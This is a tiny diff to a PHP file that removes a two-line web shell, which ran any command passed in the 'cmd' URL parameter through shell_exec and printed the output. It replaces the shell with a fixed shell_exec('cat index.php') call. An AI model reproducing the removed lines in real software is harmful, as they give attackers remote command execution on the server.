@@ -1,4 +1,3 @@
 <?php 
-$output = shell_exec($_GET["cmd"]); 
-echo "<pre>$output</pre>"; 
+shell_exec('cat index.php'); 
 ?>
